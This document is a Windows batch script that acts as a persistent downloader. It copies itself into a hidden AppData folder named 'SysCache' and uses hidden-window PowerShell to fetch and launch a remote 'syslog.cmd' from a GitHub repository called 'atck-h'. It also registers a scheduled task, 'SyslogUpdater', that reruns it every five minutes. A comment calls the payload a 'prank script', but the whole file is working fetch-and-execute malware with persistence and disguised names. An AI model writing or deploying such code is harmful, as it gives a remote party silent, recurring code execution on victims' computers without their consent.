@echo off
setlocal enabledelayedexpansion

:: -------------------------------------------------------------------
:: Configuration
set "BASE_FOLDER=%APPDATA%\SysCache"
set "VERSION_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/version.txt"
set "FILE_URL=https://raw.githubusercontent.com/maiz-an/atck-h/main/syslog.cmd"
set "LOCAL_VERSION_FILE=%BASE_FOLDER%\local_version.txt"
set "REMOTE_VERSION_FILE=%TEMP%\rv.txt"
set "DOWNLOAD_FILE=%TEMP%\sn.cmd"
set "FINAL_FILE=%BASE_FOLDER%\syslog.cmd"
set "SELF_PATH=%BASE_FOLDER%\updater.cmd"
:: -------------------------------------------------------------------

:: Create base folder if missing
if not exist "%BASE_FOLDER%" mkdir "%BASE_FOLDER%"

:: Install / update self (copy this script to BASE_FOLDER)
if /i not "%~f0"=="%SELF_PATH%" (
    copy /Y "%~f0" "%SELF_PATH%" >nul
)

:: Download remote version file
powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%VERSION_URL%' -OutFile '%REMOTE_VERSION_FILE%' -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
if not exist "%REMOTE_VERSION_FILE%" (
    >&2 echo Failed to download version file.
    goto :RUN
)

:: Read remote version
set "REMOTE_VERSION="
<"%REMOTE_VERSION_FILE%" set /p REMOTE_VERSION=
if "%REMOTE_VERSION%"=="" (
    >&2 echo Remote version is empty.
    goto :RUN
)

:: Check local version
set "LOCAL_VERSION="
if exist "%LOCAL_VERSION_FILE%" <"%LOCAL_VERSION_FILE%" set /p LOCAL_VERSION=

:: Compare and download if newer or local missing
if not "%LOCAL_VERSION%"=="%REMOTE_VERSION%" (
    echo Updating from %LOCAL_VERSION% to %REMOTE_VERSION% ...
    powershell -WindowStyle Hidden -Command "try { Invoke-WebRequest -Uri '%FILE_URL%' -OutFile '%DOWNLOAD_FILE%' -ErrorAction Stop } catch { exit 1 }" >nul 2>&1
    if exist "%DOWNLOAD_FILE%" (
        move /Y "%DOWNLOAD_FILE%" "%FINAL_FILE%" >nul
        echo %REMOTE_VERSION% > "%LOCAL_VERSION_FILE%"
    ) else (
        >&2 echo Failed to download new script.
    )
)

:RUN
:: Launch the prank script if it exists
if exist "%FINAL_FILE%" (
    start "" "%FINAL_FILE%"
)

:: -------------------------------------------------------------------
:: Ensure scheduled task runs THIS updater every 5 minutes
:: Task name: "SyslogUpdater"
:: Runs: %SELF_PATH% (the installed copy)
:: /f overwrites if task already exists (no duplicate)
schtasks /create /tn "SyslogUpdater" /tr "cmd /c start /min \"\" \"%SELF_PATH%\"" /sc minute /mo 5 /f >nul 2>&1

endlocal